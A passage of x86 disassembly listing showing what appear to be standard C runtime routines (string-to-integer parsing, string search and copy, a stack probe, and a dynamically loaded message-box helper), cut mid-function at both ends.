  40ab8b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ab8e:	0f be 11             	movsbl (%ecx),%edx
  40ab91:	83 fa 78             	cmp    $0x78,%edx
  40ab94:	74 0b                	je     0x40aba1
  40ab96:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ab99:	0f be 08             	movsbl (%eax),%ecx
  40ab9c:	83 f9 58             	cmp    $0x58,%ecx
  40ab9f:	75 1a                	jne    0x40abbb
  40aba1:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40aba4:	83 c2 01             	add    $0x1,%edx
  40aba7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40abaa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40abad:	8a 08                	mov    (%eax),%cl
  40abaf:	88 4d f8             	mov    %cl,-0x8(%ebp)
  40abb2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40abb5:	83 c2 01             	add    $0x1,%edx
  40abb8:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40abbb:	83 c8 ff             	or     $0xffffffff,%eax
  40abbe:	33 d2                	xor    %edx,%edx
  40abc0:	f7 75 10             	divl   0x10(%ebp)
  40abc3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40abc6:	83 3d 10 d5 45 00 01 	cmpl   $0x1,0x45d510
  40abcd:	7e 18                	jle    0x40abe7
  40abcf:	6a 04                	push   $0x4
  40abd1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40abd4:	25 ff 00 00 00       	and    $0xff,%eax
  40abd9:	50                   	push   %eax
  40abda:	e8 e1 08 00 00       	call   0x40b4c0
  40abdf:	83 c4 08             	add    $0x8,%esp
  40abe2:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40abe5:	eb 1b                	jmp    0x40ac02
  40abe7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40abea:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40abf0:	8b 15 04 d3 45 00    	mov    0x45d304,%edx
  40abf6:	33 c0                	xor    %eax,%eax
  40abf8:	66 8b 04 4a          	mov    (%edx,%ecx,2),%ax
  40abfc:	83 e0 04             	and    $0x4,%eax
  40abff:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40ac02:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40ac06:	74 0c                	je     0x40ac14
  40ac08:	0f be 4d f8          	movsbl -0x8(%ebp),%ecx
  40ac0c:	83 e9 30             	sub    $0x30,%ecx
  40ac0f:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40ac12:	eb 5f                	jmp    0x40ac73
  40ac14:	83 3d 10 d5 45 00 01 	cmpl   $0x1,0x45d510
  40ac1b:	7e 1c                	jle    0x40ac39
  40ac1d:	68 03 01 00 00       	push   $0x103
  40ac22:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40ac25:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40ac2b:	52                   	push   %edx
  40ac2c:	e8 8f 08 00 00       	call   0x40b4c0
  40ac31:	83 c4 08             	add    $0x8,%esp
  40ac34:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40ac37:	eb 1d                	jmp    0x40ac56
  40ac39:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40ac3c:	25 ff 00 00 00       	and    $0xff,%eax
  40ac41:	8b 0d 04 d3 45 00    	mov    0x45d304,%ecx
  40ac47:	33 d2                	xor    %edx,%edx
  40ac49:	66 8b 14 41          	mov    (%ecx,%eax,2),%dx
  40ac4d:	81 e2 03 01 00 00    	and    $0x103,%edx
  40ac53:	89 55 e0             	mov    %edx,-0x20(%ebp)
  40ac56:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40ac5a:	74 15                	je     0x40ac71
  40ac5c:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
  40ac60:	50                   	push   %eax
  40ac61:	e8 ba 14 00 00       	call   0x40c120
  40ac66:	83 c4 04             	add    $0x4,%esp
  40ac69:	83 e8 37             	sub    $0x37,%eax
  40ac6c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40ac6f:	eb 02                	jmp    0x40ac73
  40ac71:	eb 5d                	jmp    0x40acd0
  40ac73:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40ac76:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  40ac79:	72 02                	jb     0x40ac7d
  40ac7b:	eb 53                	jmp    0x40acd0
  40ac7d:	8b 55 14             	mov    0x14(%ebp),%edx
  40ac80:	83 ca 08             	or     $0x8,%edx
  40ac83:	89 55 14             	mov    %edx,0x14(%ebp)
  40ac86:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40ac89:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  40ac8c:	72 15                	jb     0x40aca3
  40ac8e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40ac91:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  40ac94:	75 1c                	jne    0x40acb2
  40ac96:	83 c8 ff             	or     $0xffffffff,%eax
  40ac99:	33 d2                	xor    %edx,%edx
  40ac9b:	f7 75 10             	divl   0x10(%ebp)
  40ac9e:	39 55 ec             	cmp    %edx,-0x14(%ebp)
  40aca1:	77 0f                	ja     0x40acb2
  40aca3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40aca6:	0f af 55 10          	imul   0x10(%ebp),%edx
  40acaa:	03 55 ec             	add    -0x14(%ebp),%edx
  40acad:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40acb0:	eb 08                	jmp    0x40acba
  40acb2:	8b 45 14             	mov    0x14(%ebp),%eax
  40acb5:	0c 04                	or     $0x4,%al
  40acb7:	89 45 14             	mov    %eax,0x14(%ebp)
  40acba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40acbd:	8a 11                	mov    (%ecx),%dl
  40acbf:	88 55 f8             	mov    %dl,-0x8(%ebp)
  40acc2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40acc5:	83 c0 01             	add    $0x1,%eax
  40acc8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40accb:	e9 f6 fe ff ff       	jmp    0x40abc6
  40acd0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40acd3:	83 e9 01             	sub    $0x1,%ecx
  40acd6:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40acd9:	8b 55 14             	mov    0x14(%ebp),%edx
  40acdc:	83 e2 08             	and    $0x8,%edx
  40acdf:	85 d2                	test   %edx,%edx
  40ace1:	75 15                	jne    0x40acf8
  40ace3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40ace7:	74 06                	je     0x40acef
  40ace9:	8b 45 08             	mov    0x8(%ebp),%eax
  40acec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40acef:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40acf6:	eb 72                	jmp    0x40ad6a
  40acf8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40acfb:	83 e1 04             	and    $0x4,%ecx
  40acfe:	85 c9                	test   %ecx,%ecx
  40ad00:	75 30                	jne    0x40ad32
  40ad02:	8b 55 14             	mov    0x14(%ebp),%edx
  40ad05:	83 e2 01             	and    $0x1,%edx
  40ad08:	85 d2                	test   %edx,%edx
  40ad0a:	75 5e                	jne    0x40ad6a
  40ad0c:	8b 45 14             	mov    0x14(%ebp),%eax
  40ad0f:	83 e0 02             	and    $0x2,%eax
  40ad12:	85 c0                	test   %eax,%eax
  40ad14:	74 09                	je     0x40ad1f
  40ad16:	81 7d f4 00 00 00 80 	cmpl   $0x80000000,-0xc(%ebp)
  40ad1d:	77 13                	ja     0x40ad32
  40ad1f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40ad22:	83 e1 02             	and    $0x2,%ecx
  40ad25:	85 c9                	test   %ecx,%ecx
  40ad27:	75 41                	jne    0x40ad6a
  40ad29:	81 7d f4 ff ff ff 7f 	cmpl   $0x7fffffff,-0xc(%ebp)
  40ad30:	76 38                	jbe    0x40ad6a
  40ad32:	e8 c9 13 00 00       	call   0x40c100
  40ad37:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  40ad3d:	8b 55 14             	mov    0x14(%ebp),%edx
  40ad40:	83 e2 01             	and    $0x1,%edx
  40ad43:	85 d2                	test   %edx,%edx
  40ad45:	74 09                	je     0x40ad50
  40ad47:	c7 45 f4 ff ff ff ff 	movl   $0xffffffff,-0xc(%ebp)
  40ad4e:	eb 1a                	jmp    0x40ad6a
  40ad50:	8b 45 14             	mov    0x14(%ebp),%eax
  40ad53:	83 e0 02             	and    $0x2,%eax
  40ad56:	85 c0                	test   %eax,%eax
  40ad58:	74 09                	je     0x40ad63
  40ad5a:	c7 45 f4 00 00 00 80 	movl   $0x80000000,-0xc(%ebp)
  40ad61:	eb 07                	jmp    0x40ad6a
  40ad63:	c7 45 f4 ff ff ff 7f 	movl   $0x7fffffff,-0xc(%ebp)
  40ad6a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40ad6e:	74 08                	je     0x40ad78
  40ad70:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ad73:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ad76:	89 11                	mov    %edx,(%ecx)
  40ad78:	8b 45 14             	mov    0x14(%ebp),%eax
  40ad7b:	83 e0 02             	and    $0x2,%eax
  40ad7e:	85 c0                	test   %eax,%eax
  40ad80:	74 08                	je     0x40ad8a
  40ad82:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40ad85:	f7 d9                	neg    %ecx
  40ad87:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40ad8a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40ad8d:	8b e5                	mov    %ebp,%esp
  40ad8f:	5d                   	pop    %ebp
  40ad90:	c3                   	ret
  40ad91:	cc                   	int3
  40ad92:	cc                   	int3
  40ad93:	cc                   	int3
  40ad94:	cc                   	int3
  40ad95:	cc                   	int3
  40ad96:	cc                   	int3
  40ad97:	cc                   	int3
  40ad98:	cc                   	int3
  40ad99:	cc                   	int3
  40ad9a:	cc                   	int3
  40ad9b:	cc                   	int3
  40ad9c:	cc                   	int3
  40ad9d:	cc                   	int3
  40ad9e:	cc                   	int3
  40ad9f:	cc                   	int3
  40ada0:	8d 42 ff             	lea    -0x1(%edx),%eax
  40ada3:	5b                   	pop    %ebx
  40ada4:	c3                   	ret
  40ada5:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40adac:	8d 64 24 00          	lea    0x0(%esp),%esp
  40adb0:	33 c0                	xor    %eax,%eax
  40adb2:	8a 44 24 08          	mov    0x8(%esp),%al
  40adb6:	53                   	push   %ebx
  40adb7:	8b d8                	mov    %eax,%ebx
  40adb9:	c1 e0 08             	shl    $0x8,%eax
  40adbc:	8b 54 24 08          	mov    0x8(%esp),%edx
  40adc0:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40adc6:	74 13                	je     0x40addb
  40adc8:	8a 0a                	mov    (%edx),%cl
  40adca:	42                   	inc    %edx
  40adcb:	38 d9                	cmp    %bl,%cl
  40adcd:	74 d1                	je     0x40ada0
  40adcf:	84 c9                	test   %cl,%cl
  40add1:	74 51                	je     0x40ae24
  40add3:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40add9:	75 ed                	jne    0x40adc8
  40addb:	0b d8                	or     %eax,%ebx
  40addd:	57                   	push   %edi
  40adde:	8b c3                	mov    %ebx,%eax
  40ade0:	c1 e3 10             	shl    $0x10,%ebx
  40ade3:	56                   	push   %esi
  40ade4:	0b d8                	or     %eax,%ebx
  40ade6:	8b 0a                	mov    (%edx),%ecx
  40ade8:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  40aded:	8b c1                	mov    %ecx,%eax
  40adef:	8b f7                	mov    %edi,%esi
  40adf1:	33 cb                	xor    %ebx,%ecx
  40adf3:	03 f0                	add    %eax,%esi
  40adf5:	03 f9                	add    %ecx,%edi
  40adf7:	83 f1 ff             	xor    $0xffffffff,%ecx
  40adfa:	83 f0 ff             	xor    $0xffffffff,%eax
  40adfd:	33 cf                	xor    %edi,%ecx
  40adff:	33 c6                	xor    %esi,%eax
  40ae01:	83 c2 04             	add    $0x4,%edx
  40ae04:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  40ae0a:	75 1c                	jne    0x40ae28
  40ae0c:	25 00 01 01 81       	and    $0x81010100,%eax
  40ae11:	74 d3                	je     0x40ade6
  40ae13:	25 00 01 01 01       	and    $0x1010100,%eax
  40ae18:	75 08                	jne    0x40ae22
  40ae1a:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  40ae20:	75 c4                	jne    0x40ade6
  40ae22:	5e                   	pop    %esi
  40ae23:	5f                   	pop    %edi
  40ae24:	5b                   	pop    %ebx
  40ae25:	33 c0                	xor    %eax,%eax
  40ae27:	c3                   	ret
  40ae28:	8b 42 fc             	mov    -0x4(%edx),%eax
  40ae2b:	38 d8                	cmp    %bl,%al
  40ae2d:	74 36                	je     0x40ae65
  40ae2f:	84 c0                	test   %al,%al
  40ae31:	74 ef                	je     0x40ae22
  40ae33:	38 dc                	cmp    %bl,%ah
  40ae35:	74 27                	je     0x40ae5e
  40ae37:	84 e4                	test   %ah,%ah
  40ae39:	74 e7                	je     0x40ae22
  40ae3b:	c1 e8 10             	shr    $0x10,%eax
  40ae3e:	38 d8                	cmp    %bl,%al
  40ae40:	74 15                	je     0x40ae57
  40ae42:	84 c0                	test   %al,%al
  40ae44:	74 dc                	je     0x40ae22
  40ae46:	38 dc                	cmp    %bl,%ah
  40ae48:	74 06                	je     0x40ae50
  40ae4a:	84 e4                	test   %ah,%ah
  40ae4c:	74 d4                	je     0x40ae22
  40ae4e:	eb 96                	jmp    0x40ade6
  40ae50:	5e                   	pop    %esi
  40ae51:	5f                   	pop    %edi
  40ae52:	8d 42 ff             	lea    -0x1(%edx),%eax
  40ae55:	5b                   	pop    %ebx
  40ae56:	c3                   	ret
  40ae57:	8d 42 fe             	lea    -0x2(%edx),%eax
  40ae5a:	5e                   	pop    %esi
  40ae5b:	5f                   	pop    %edi
  40ae5c:	5b                   	pop    %ebx
  40ae5d:	c3                   	ret
  40ae5e:	8d 42 fd             	lea    -0x3(%edx),%eax
  40ae61:	5e                   	pop    %esi
  40ae62:	5f                   	pop    %edi
  40ae63:	5b                   	pop    %ebx
  40ae64:	c3                   	ret
  40ae65:	8d 42 fc             	lea    -0x4(%edx),%eax
  40ae68:	5e                   	pop    %esi
  40ae69:	5f                   	pop    %edi
  40ae6a:	5b                   	pop    %ebx
  40ae6b:	c3                   	ret
  40ae6c:	cc                   	int3
  40ae6d:	cc                   	int3
  40ae6e:	cc                   	int3
  40ae6f:	cc                   	int3
  40ae70:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40ae74:	57                   	push   %edi
  40ae75:	53                   	push   %ebx
  40ae76:	56                   	push   %esi
  40ae77:	8a 11                	mov    (%ecx),%dl
  40ae79:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40ae7d:	84 d2                	test   %dl,%dl
  40ae7f:	74 69                	je     0x40aeea
  40ae81:	8a 71 01             	mov    0x1(%ecx),%dh
  40ae84:	84 f6                	test   %dh,%dh
  40ae86:	74 4f                	je     0x40aed7
  40ae88:	8b f7                	mov    %edi,%esi
  40ae8a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40ae8e:	8a 07                	mov    (%edi),%al
  40ae90:	46                   	inc    %esi
  40ae91:	38 d0                	cmp    %dl,%al
  40ae93:	74 15                	je     0x40aeaa
  40ae95:	84 c0                	test   %al,%al
  40ae97:	74 0b                	je     0x40aea4
  40ae99:	8a 06                	mov    (%esi),%al
  40ae9b:	46                   	inc    %esi
  40ae9c:	38 d0                	cmp    %dl,%al
  40ae9e:	74 0a                	je     0x40aeaa
  40aea0:	84 c0                	test   %al,%al
  40aea2:	75 f5                	jne    0x40ae99
  40aea4:	5e                   	pop    %esi
  40aea5:	5b                   	pop    %ebx
  40aea6:	5f                   	pop    %edi
  40aea7:	33 c0                	xor    %eax,%eax
  40aea9:	c3                   	ret
  40aeaa:	8a 06                	mov    (%esi),%al
  40aeac:	46                   	inc    %esi
  40aead:	38 f0                	cmp    %dh,%al
  40aeaf:	75 eb                	jne    0x40ae9c
  40aeb1:	8d 7e ff             	lea    -0x1(%esi),%edi
  40aeb4:	8a 61 02             	mov    0x2(%ecx),%ah
  40aeb7:	84 e4                	test   %ah,%ah
  40aeb9:	74 28                	je     0x40aee3
  40aebb:	8a 06                	mov    (%esi),%al
  40aebd:	83 c6 02             	add    $0x2,%esi
  40aec0:	38 e0                	cmp    %ah,%al
  40aec2:	75 c4                	jne    0x40ae88
  40aec4:	8a 41 03             	mov    0x3(%ecx),%al
  40aec7:	84 c0                	test   %al,%al
  40aec9:	74 18                	je     0x40aee3
  40aecb:	8a 66 ff             	mov    -0x1(%esi),%ah
  40aece:	83 c1 02             	add    $0x2,%ecx
  40aed1:	38 e0                	cmp    %ah,%al
  40aed3:	74 df                	je     0x40aeb4
  40aed5:	eb b1                	jmp    0x40ae88
  40aed7:	33 c0                	xor    %eax,%eax
  40aed9:	5e                   	pop    %esi
  40aeda:	5b                   	pop    %ebx
  40aedb:	5f                   	pop    %edi
  40aedc:	8a c2                	mov    %dl,%al
  40aede:	e9 d3 fe ff ff       	jmp    0x40adb6
  40aee3:	8d 47 ff             	lea    -0x1(%edi),%eax
  40aee6:	5e                   	pop    %esi
  40aee7:	5b                   	pop    %ebx
  40aee8:	5f                   	pop    %edi
  40aee9:	c3                   	ret
  40aeea:	8b c7                	mov    %edi,%eax
  40aeec:	5e                   	pop    %esi
  40aeed:	5b                   	pop    %ebx
  40aeee:	5f                   	pop    %edi
  40aeef:	c3                   	ret
  40aef0:	55                   	push   %ebp
  40aef1:	8b ec                	mov    %esp,%ebp
  40aef3:	57                   	push   %edi
  40aef4:	56                   	push   %esi
  40aef5:	53                   	push   %ebx
  40aef6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40aef9:	e3 26                	jecxz  0x40af21
  40aefb:	8b d9                	mov    %ecx,%ebx
  40aefd:	8b 7d 08             	mov    0x8(%ebp),%edi
  40af00:	8b f7                	mov    %edi,%esi
  40af02:	33 c0                	xor    %eax,%eax
  40af04:	f2 ae                	repnz scas %es:(%edi),%al
  40af06:	f7 d9                	neg    %ecx
  40af08:	03 cb                	add    %ebx,%ecx
  40af0a:	8b fe                	mov    %esi,%edi
  40af0c:	8b 75 0c             	mov    0xc(%ebp),%esi
  40af0f:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  40af11:	8a 46 ff             	mov    -0x1(%esi),%al
  40af14:	33 c9                	xor    %ecx,%ecx
  40af16:	3a 47 ff             	cmp    -0x1(%edi),%al
  40af19:	77 04                	ja     0x40af1f
  40af1b:	74 04                	je     0x40af21
  40af1d:	49                   	dec    %ecx
  40af1e:	49                   	dec    %ecx
  40af1f:	f7 d1                	not    %ecx
  40af21:	8b c1                	mov    %ecx,%eax
  40af23:	5b                   	pop    %ebx
  40af24:	5e                   	pop    %esi
  40af25:	5f                   	pop    %edi
  40af26:	c9                   	leave
  40af27:	c3                   	ret
  40af28:	cc                   	int3
  40af29:	cc                   	int3
  40af2a:	cc                   	int3
  40af2b:	cc                   	int3
  40af2c:	cc                   	int3
  40af2d:	cc                   	int3
  40af2e:	cc                   	int3
  40af2f:	cc                   	int3
  40af30:	51                   	push   %ecx
  40af31:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40af36:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40af3a:	72 14                	jb     0x40af50
  40af3c:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  40af42:	2d 00 10 00 00       	sub    $0x1000,%eax
  40af47:	85 01                	test   %eax,(%ecx)
  40af49:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40af4e:	73 ec                	jae    0x40af3c
  40af50:	2b c8                	sub    %eax,%ecx
  40af52:	8b c4                	mov    %esp,%eax
  40af54:	85 01                	test   %eax,(%ecx)
  40af56:	8b e1                	mov    %ecx,%esp
  40af58:	8b 08                	mov    (%eax),%ecx
  40af5a:	8b 40 04             	mov    0x4(%eax),%eax
  40af5d:	50                   	push   %eax
  40af5e:	c3                   	ret
  40af5f:	cc                   	int3
  40af60:	55                   	push   %ebp
  40af61:	8b ec                	mov    %esp,%ebp
  40af63:	83 ec 08             	sub    $0x8,%esp
  40af66:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40af6d:	83 3d 50 de 45 00 00 	cmpl   $0x0,0x45de50
  40af74:	75 5d                	jne    0x40afd3
  40af76:	68 60 fb 40 00       	push   $0x40fb60
  40af7b:	ff 15 04 f0 40 00    	call   *0x40f004
  40af81:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40af84:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40af88:	74 1d                	je     0x40afa7
  40af8a:	68 d0 fc 40 00       	push   $0x40fcd0
  40af8f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40af92:	50                   	push   %eax
  40af93:	ff 15 00 f0 40 00    	call   *0x40f000
  40af99:	a3 50 de 45 00       	mov    %eax,0x45de50
  40af9e:	83 3d 50 de 45 00 00 	cmpl   $0x0,0x45de50
  40afa5:	75 04                	jne    0x40afab
  40afa7:	33 c0                	xor    %eax,%eax
  40afa9:	eb 6c                	jmp    0x40b017
  40afab:	68 c0 fc 40 00       	push   $0x40fcc0
  40afb0:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40afb3:	51                   	push   %ecx
  40afb4:	ff 15 00 f0 40 00    	call   *0x40f000
  40afba:	a3 54 de 45 00       	mov    %eax,0x45de54
  40afbf:	68 ac fc 40 00       	push   $0x40fcac
  40afc4:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40afc7:	52                   	push   %edx
  40afc8:	ff 15 00 f0 40 00    	call   *0x40f000
  40afce:	a3 58 de 45 00       	mov    %eax,0x45de58
  40afd3:	83 3d 54 de 45 00 00 	cmpl   $0x0,0x45de54
  40afda:	74 09                	je     0x40afe5
  40afdc:	ff 15 54 de 45 00    	call   *0x45de54
  40afe2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40afe5:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40afe9:	74 16                	je     0x40b001
  40afeb:	83 3d 58 de 45 00 00 	cmpl   $0x0,0x45de58
  40aff2:	74 0d                	je     0x40b001
  40aff4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40aff7:	50                   	push   %eax
  40aff8:	ff 15 58 de 45 00    	call   *0x45de58
  40affe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b001:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40b004:	51                   	push   %ecx
  40b005:	8b 55 0c             	mov    0xc(%ebp),%edx
  40b008:	52                   	push   %edx
  40b009:	8b 45 08             	mov    0x8(%ebp),%eax
  40b00c:	50                   	push   %eax
  40b00d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b010:	51                   	push   %ecx
  40b011:	ff 15 50 de 45 00    	call   *0x45de50
  40b017:	8b e5                	mov    %ebp,%esp
  40b019:	5d                   	pop    %ebp
  40b01a:	c3                   	ret
  40b01b:	cc                   	int3
  40b01c:	cc                   	int3
  40b01d:	cc                   	int3
  40b01e:	cc                   	int3
  40b01f:	cc                   	int3
  40b020:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40b024:	57                   	push   %edi
  40b025:	85 c9                	test   %ecx,%ecx
  40b027:	74 7a                	je     0x40b0a3
  40b029:	56                   	push   %esi
  40b02a:	53                   	push   %ebx
  40b02b:	8b d9                	mov    %ecx,%ebx
  40b02d:	8b 74 24 14          	mov    0x14(%esp),%esi
  40b031:	f7 c6 03 00 00 00    	test   $0x3,%esi
  40b037:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40b03b:	75 07                	jne    0x40b044
  40b03d:	c1 e9 02             	shr    $0x2,%ecx
  40b040:	75 6f                	jne    0x40b0b1
  40b042:	eb 21                	jmp    0x40b065
  40b044:	8a 06                	mov    (%esi),%al
  40b046:	46                   	inc    %esi
  40b047:	88 07                	mov    %al,(%edi)
  40b049:	47                   	inc    %edi
  40b04a:	49                   	dec    %ecx
  40b04b:	74 25                	je     0x40b072
  40b04d:	84 c0                	test   %al,%al
  40b04f:	74 29                	je     0x40b07a
  40b051:	f7 c6 03 00 00 00    	test   $0x3,%esi
  40b057:	75 eb                	jne    0x40b044
  40b059:	8b d9                	mov    %ecx,%ebx
  40b05b:	c1 e9 02             	shr    $0x2,%ecx
  40b05e:	75 51                	jne    0x40b0b1
  40b060:	83 e3 03             	and    $0x3,%ebx
  40b063:	74 0d                	je     0x40b072
  40b065:	8a 06                	mov    (%esi),%al
  40b067:	46                   	inc    %esi
  40b068:	88 07                	mov    %al,(%edi)
  40b06a:	47                   	inc    %edi
  40b06b:	84 c0                	test   %al,%al
  40b06d:	74 2f                	je     0x40b09e
  40b06f:	4b                   	dec    %ebx
  40b070:	75 f3                	jne    0x40b065
  40b072:	8b 44 24 10          	mov    0x10(%esp),%eax
  40b076:	5b                   	pop    %ebx
  40b077:	5e                   	pop    %esi
  40b078:	5f                   	pop    %edi
  40b079:	c3                   	ret
  40b07a:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40b080:	74 12                	je     0x40b094
  40b082:	88 07                	mov    %al,(%edi)
  40b084:	47                   	inc    %edi
  40b085:	49                   	dec    %ecx
  40b086:	0f 84 8a 00 00 00    	je     0x40b116
  40b08c:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40b092:	75 ee                	jne    0x40b082
  40b094:	8b d9                	mov    %ecx,%ebx
  40b096:	c1 e9 02             	shr    $0x2,%ecx
  40b099:	75 6c                	jne    0x40b107
  40b09b:	88 07                	mov    %al,(%edi)
  40b09d:	47                   	inc    %edi
  40b09e:	4b                   	dec    %ebx
  40b09f:	75 fa                	jne    0x40b09b
  40b0a1:	5b                   	pop    %ebx
  40b0a2:	5e                   	pop    %esi
  40b0a3:	8b 44 24 08          	mov    0x8(%esp),%eax
  40b0a7:	5f                   	pop    %edi
  40b0a8:	c3                   	ret
  40b0a9:	89 17                	mov    %edx,(%edi)
  40b0ab:	83 c7 04             	add    $0x4,%edi
  40b0ae:	49                   	dec    %ecx
  40b0af:	74 af                	je     0x40b060
  40b0b1:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  40b0b6:	8b 06                	mov    (%esi),%eax
  40b0b8:	03 d0                	add    %eax,%edx
  40b0ba:	83 f0 ff             	xor    $0xffffffff,%eax
  40b0bd:	33 c2                	xor    %edx,%eax
  40b0bf:	8b 16                	mov    (%esi),%edx
  40b0c1:	83 c6 04             	add    $0x4,%esi
  40b0c4:	a9 00 01 01 81       	test   $0x81010100,%eax
  40b0c9:	74 de                	je     0x40b0a9
  40b0cb:	84 d2                	test   %dl,%dl
  40b0cd:	74 2c                	je     0x40b0fb
  40b0cf:	84 f6                	test   %dh,%dh
  40b0d1:	74 1e                	je     0x40b0f1
  40b0d3:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  40b0d9:	74 0c                	je     0x40b0e7
  40b0db:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  40b0e1:	75 c6                	jne    0x40b0a9
  40b0e3:	89 17                	mov    %edx,(%edi)
  40b0e5:	eb 18                	jmp    0x40b0ff
  40b0e7:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  40b0ed:	89 17                	mov    %edx,(%edi)
  40b0ef:	eb 0e                	jmp    0x40b0ff
  40b0f1:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40b0f7:	89 17                	mov    %edx,(%edi)
  40b0f9:	eb 04                	jmp    0x40b0ff
  40b0fb:	33 d2                	xor    %edx,%edx
  40b0fd:	89 17                	mov    %edx,(%edi)
  40b0ff:	83 c7 04             	add    $0x4,%edi
  40b102:	33 c0                	xor    %eax,%eax
  40b104:	49                   	dec    %ecx
  40b105:	74 0a                	je     0x40b111
  40b107:	33 c0                	xor    %eax,%eax
  40b109:	89 07                	mov    %eax,(%edi)
  40b10b:	83 c7 04             	add    $0x4,%edi
  40b10e:	49                   	dec    %ecx
  40b10f:	75 f8                	jne    0x40b109
  40b111:	83 e3 03             	and    $0x3,%ebx
  40b114:	75 85                	jne    0x40b09b
  40b116:	8b 44 24 10          	mov    0x10(%esp),%eax
  40b11a:	5b                   	pop    %ebx
  40b11b:	5e                   	pop    %esi
  40b11c:	5f                   	pop    %edi
  40b11d:	c3                   	ret
  40b11e:	cc                   	int3
  40b11f:	cc                   	int3
  40b120:	55                   	push   %ebp
  40b121:	8b ec                	mov    %esp,%ebp
  40b123:	51                   	push   %ecx
  40b124:	a1 60 de 45 00       	mov    0x45de60,%eax
  40b129:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b12c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40b130:	74 0e                	je     0x40b140
  40b132:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b135:	51                   	push   %ecx
  40b136:	ff 55 fc             	call   *-0x4(%ebp)
  40b139:	83 c4 04             	add    $0x4,%esp
  40b13c:	85 c0                	test   %eax,%eax
  40b13e:	75 04                	jne    0x40b144
  40b140:	33 c0                	xor    %eax,%eax
  40b142:	eb 05                	jmp    0x40b149
  40b144:	b8 01 00 00 00       	mov    $0x1,%eax
  40b149:	8b e5                	mov    %ebp,%esp
  40b14b:	5d                   	pop    %ebp
  40b14c:	c3                   	ret
  40b14d:	cc                   	int3
  40b14e:	cc                   	int3
  40b14f:	cc                   	int3
  40b150:	55                   	push   %ebp
  40b151:	8b ec                	mov    %esp,%ebp
  40b153:	6a ff                	push   $0xffffffff
